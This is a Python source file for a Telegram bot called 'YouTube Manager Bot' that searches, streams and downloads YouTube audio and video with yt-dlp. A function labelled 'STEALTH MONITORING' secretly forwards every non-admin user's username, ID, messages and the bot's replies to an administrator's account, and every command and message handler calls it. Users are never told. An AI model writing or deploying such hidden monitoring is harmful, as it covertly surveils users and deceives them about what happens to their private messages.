import os
import requests
import yt_dlp
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time
import urllib.parse
import re

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== REAL YOUTUBE SEARCH ====================
def search_youtube_real(query):
    """Real YouTube search using yt-dlp"""
    try:
        print(f"🔍 Real search for: {query}")
        
        ydl_opts = {
            'quiet': True,
            'extract_flat': True,
            'force_json': False,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            # Use ytsearch for real YouTube search
            search_query = f"ytsearch10:{query}"
            info = ydl.extract_info(search_query, download=False)
            
            results = []
            if 'entries' in info:
                for entry in info['entries']:
                    if entry:
                        results.append({
                            'title': entry.get('title', 'No title'),
                            'url': entry.get('url', ''),
                            'channel': entry.get('channel', 'Unknown channel'),
                            'duration': entry.get('duration', 0),
                            'view_count': entry.get('view_count', 0),
                        })
            
            print(f"✅ Found {len(results)} real results")
            return results
            
    except Exception as e:
        print(f"❌ Real search error: {e}")
        return []

# ==================== GET STREAM URL ====================
def get_stream_url(video_url, format_type='audio'):
    """Get direct stream URL for Telegram"""
    try:
        if format_type == 'audio':
            ydl_opts = {
                'format': 'bestaudio/best',
                'quiet': True,
            }
        else:
            ydl_opts = {
                'format': 'best[height<=480]',  # Lower quality for faster streaming
                'quiet': True,
            }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=False)
            return info['url']  # Direct stream URL
            
    except Exception as e:
        print(f"Stream URL error: {e}")
        return None

# ==================== DOWNLOAD MEDIA ====================
def download_media(video_url, chat_id, media_type='audio'):
    """Download media file"""
    try:
        if media_type == 'audio':
            bot.send_message(chat_id, "🎵 Downloading audio as MP3...")
            ydl_opts = {
                'format': 'bestaudio/best',
                'outtmpl': 'downloads/%(title)s.%(ext)s',
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',
                    'preferredcodec': 'mp3',
                    'preferredquality': '192',
                }],
            }
        else:
            bot.send_message(chat_id, "🎬 Downloading video...")
            ydl_opts = {
                'format': 'best[height<=720]',
                'outtmpl': 'downloads/%(title)s.%(ext)s',
            }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            
            if media_type == 'audio':
                original_file = ydl.prepare_filename(info)
                media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            else:
                media_file = ydl.prepare_filename(info)
            
            # Send file
            if os.path.exists(media_file):
                if media_type == 'audio':
                    with open(media_file, 'rb') as media:
                        bot.send_audio(chat_id, media, title=info['title'][:64])
                else:
                    with open(media_file, 'rb') as media:
                        bot.send_video(chat_id, media, caption=info['title'][:64])
                
                # Cleanup
                os.remove(media_file)
                if media_type == 'audio' and os.path.exists(original_file):
                    os.remove(original_file)
                    
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.send_message(chat_id, "🔒 YouTube blocked download. Try streaming instead.")
        else:
            bot.send_message(chat_id, f"❌ Download failed: {error_msg[:100]}")

# ==================== STREAM MEDIA ====================
def stream_media(video_url, chat_id, media_type='audio'):
    """Stream media directly in Telegram"""
    try:
        if media_type == 'audio':
            bot.send_message(chat_id, "🎵 Getting audio stream...")
            stream_url = get_stream_url(video_url, 'audio')
            
            if stream_url:
                # For audio, we need to download and send as file for proper streaming
                download_media(video_url, chat_id, 'audio')
            else:
                bot.send_message(chat_id, "❌ Could not get audio stream")
                
        else:
            bot.send_message(chat_id, "🎬 Getting video stream...")
            stream_url = get_stream_url(video_url, 'video')
            
            if stream_url:
                # Try to send as video with stream URL
                try:
                    # Get video info for caption
                    with yt_dlp.YoutubeDL({'quiet': True}) as ydl:
                        info = ydl.extract_info(video_url, download=False)
                    
                    bot.send_message(chat_id, 
                                   f"🎬 *{info['title'][:64]}*\n\n"
                                   f"📺 Stream URL:\n{stream_url}\n\n"
                                   f"🔗 Original: {video_url}",
                                   parse_mode='Markdown')
                except:
                    bot.send_message(chat_id, f"📺 Stream URL: {stream_url}")
            else:
                bot.send_message(chat_id, "❌ Could not get video stream")
                
    except Exception as e:
        bot.send_message(chat_id, f"❌ Streaming error: {str(e)[:100]}")

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Features:*
• Search REAL YouTube content
• Stream audio/video directly
• Download as MP3/MP4 files
• No dummy data - real results!

*Commands:*
/switch - Start searching
    """
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 YouTube Music", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 YouTube Videos", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose what to search:*\n\n• 🎵 Music - Songs, artists, audio\n• 🎬 Videos - Movies, clips, content"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    username = call.from_user.username or "Unknown"
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *Music Mode*\n\nSend me a song name, artist, or music genre to search REAL YouTube music."
        else:
            response = "🎬 *Video Mode*\n\nSend me a video title, movie name, or topic to search REAL YouTube videos."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, response, False)
    
    elif call.data.startswith('options_'):
        _, video_url = call.data.split('_', 1)
        mode = user_sessions[user_id].get('mode', 'video')
        
        markup = types.InlineKeyboardMarkup()
        
        if mode == 'music':
            btn_stream = types.InlineKeyboardButton("🎵 Stream Audio", callback_data=f"stream_audio_{video_url}")
            btn_download = types.InlineKeyboardButton("📥 Download MP3", callback_data=f"download_audio_{video_url}")
            markup.add(btn_stream, btn_download)
        else:
            btn_stream = types.InlineKeyboardButton("🎬 Stream Video", callback_data=f"stream_video_{video_url}")
            btn_download = types.InlineKeyboardButton("📥 Download MP4", callback_data=f"download_video_{video_url}")
            markup.add(btn_stream, btn_download)
        
        btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=video_url)
        markup.add(btn_watch)
        
        bot.edit_message_text("Choose how you want to enjoy this content:",
                            call.message.chat.id, call.message.message_id,
                            reply_markup=markup)
    
    elif call.data.startswith('stream_'):
        _, media_type, video_url = call.data.split('_', 2)
        bot.edit_message_text(f"🔄 Preparing {media_type} stream...",
                            call.message.chat.id, call.message.message_id)
        stream_media(video_url, call.message.chat.id, media_type)
    
    elif call.data.startswith('download_'):
        _, media_type, video_url = call.data.split('_', 2)
        bot.edit_message_text(f"📥 Downloading {media_type}...",
                            call.message.chat.id, call.message.message_id)
        download_media(video_url, call.message.chat.id, media_type)

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct YouTube URL
            markup = types.InlineKeyboardMarkup()
            
            if mode == 'music':
                btn_stream = types.InlineKeyboardButton("🎵 Stream Audio", callback_data=f"stream_audio_{user_input}")
                btn_download = types.InlineKeyboardButton("📥 Download MP3", callback_data=f"download_audio_{user_input}")
            else:
                btn_stream = types.InlineKeyboardButton("🎬 Stream Video", callback_data=f"stream_video_{user_input}")
                btn_download = types.InlineKeyboardButton("📥 Download MP4", callback_data=f"download_video_{user_input}")
            
            markup.add(btn_stream, btn_download)
            btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=user_input)
            markup.add(btn_watch)
            
            bot.reply_to(message, "🎯 *YouTube URL Detected*\n\nChoose your option:",
                        reply_markup=markup, parse_mode='Markdown')
                        
        else:
            # Search query
            bot.reply_to(message, f"🔍 *Searching REAL YouTube for:* {user_input}", 
                        parse_mode='Markdown')
            
            results = search_youtube_real(user_input)
            
            if results:
                response = f"📋 *Real Search Results:*\n\n"
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    # Clean title for display
                    title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
                    response += f"{i}. *{title}*\n"
                    response += f"   👉 {result['channel']}\n\n"
                    
                    btn = types.InlineKeyboardButton(f"🎯 Select {i}", callback_data=f"options_{result['url']}")
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No REAL results found. Try different keywords or check your connection.")
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
        return
    
    # Default response
    default_response = "🤖 Use /switch to start searching REAL YouTube content!"
    bot.reply_to(message, default_response)
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, default_response, False)

# ==================== FLASK APP & BOT RUN ====================
@app.route('/')
def home():
    return "YouTube Manager Bot is Running with REAL Search!"

def run_bot():
    print("🤖 Starting YouTube Manager Bot with REAL search...")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(5)
        run_bot()

if __name__ == '__main__':
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
    
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=8080)